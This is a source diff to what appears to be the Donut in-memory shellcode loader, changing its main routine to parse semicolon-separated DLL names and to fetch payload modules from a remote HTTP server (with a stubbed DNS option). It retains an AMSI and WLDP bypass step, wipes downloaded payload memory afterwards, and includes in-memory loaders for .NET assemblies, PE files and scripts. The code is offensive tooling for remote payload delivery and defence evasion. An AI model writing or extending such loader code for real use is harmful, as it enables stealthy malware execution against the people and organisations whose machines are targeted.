@@ -66,6 +66,8 @@ DWORD MainProc(LPVOID lpParameter) {
     ULONG64              hash;
     BOOL                 disabled, term;
     NTSTATUS             nts;
+    PCHAR                str;
+    CHAR                 path[MAX_PATH];
     
     DPRINT("Maru IV : %" PRIX64, inst->iv);
     
@@ -135,9 +137,20 @@ DWORD MainProc(LPVOID lpParameter) {
     inst->api.addr[0] = xGetProcAddress(inst, inst->api.hash[0], inst->iv);
     if(inst->api.addr[0] == NULL) return -1;
     
-    for(i=0; i<inst->dll_cnt; i++) {
-      DPRINT("Loading %i of %i : %s ...", (i+1), inst->dll_cnt, inst->dll_name[i]);
-      inst->api.LoadLibraryA(inst->dll_name[i]);
+    str = (PCHAR)inst->dll_names;
+    
+    // load the DLL required
+    for(;;) {
+      // store string until null byte or semi-colon encountered
+      for(i=0; str[i] != '\0' && str[i] !=';' && i<MAX_PATH; i++) path[i] = str[i];
+      // nothing stored? end
+      if(i == 0) break;
+      // skip name plus one for separator
+      str += (i + 1);
+      // store null terminator
+      path[i] = '\0';
+      DPRINT("Loading %s", path);
+      inst->api.LoadLibraryA(path);
     }
     
     DPRINT("Resolving %i API", inst->api_cnt);
@@ -153,17 +166,20 @@ DWORD MainProc(LPVOID lpParameter) {
       }
     }
     
-    if(inst->type == DONUT_INSTANCE_URL) {
-      DPRINT("Instance is URL");
-      if(!DownloadModule(inst)) goto erase_memory;
-    }
-    
-    if(inst->type == DONUT_INSTANCE_PIC) {
-      DPRINT("Using module embedded in instance");
-      mod = (PDONUT_MODULE)&inst->module.x;
-    } else {
-      DPRINT("Loading module from allocated memory");
+    if(inst->type == DONUT_INSTANCE_HTTP) {
+      DPRINT("Module is stored on remote HTTP server.");
+      if(!DownloadFromHTTP(inst)) goto erase_memory;
       mod = inst->module.p;
+    } else
+    if(inst->type == DONUT_INSTANCE_DNS) {
+      DPRINT("Module is stored on remote DNS server. (Currently unsupported)");
+      goto erase_memory;
+      //if(!DownloadFromDNS(inst)) goto erase_memory;
+      mod = inst->module.p;
+    } else
+    if(inst->type == DONUT_INSTANCE_EMBED) {
+      DPRINT("Module is embedded.");
+      mod = (PDONUT_MODULE)&inst->module.x;
     }
     
     // try bypassing AMSI and WLDP?
@@ -181,7 +197,7 @@ DWORD MainProc(LPVOID lpParameter) {
         goto erase_memory;
     }
     
-    // module data is compressed?
+    // module is compressed?
     if(mod->compress != DONUT_COMPRESS_NONE) {
       DPRINT("Compression engine is %"PRIx32, mod->compress);
       
@@ -255,7 +271,9 @@ DWORD MainProc(LPVOID lpParameter) {
     
 erase_memory:
     // if module was downloaded
-    if(inst->type == DONUT_INSTANCE_URL) {
+    if(inst->type == DONUT_INSTANCE_HTTP || 
+       inst->type == DONUT_INSTANCE_DNS) 
+    {
       if(inst->module.p != NULL) {
         // overwrite memory with zeros
         Memset(inst->module.p, 0, (DWORD)inst->mod_len);
@@ -285,13 +303,14 @@ erase_memory:
     return 0;
 }
 
-int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[]) {
+int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[DONUT_MAX_NAME]) {
     return inst->api.MultiByteToWideChar(CP_ACP, 0, input, 
       -1, output, DONUT_MAX_NAME);
 }
 
 #include "peb.c"             // resolve functions in export table
-#include "http_client.c"     // For downloading module
+#include "http_client.c"     // Download module from HTTP server
+//#include "dns_client.c"      // Download module from DNS server
 #include "inmem_dotnet.c"    // .NET assemblies
 #include "inmem_pe.c"        // Unmanaged PE/DLL files
 #include "inmem_script.c"    // VBS/JS files
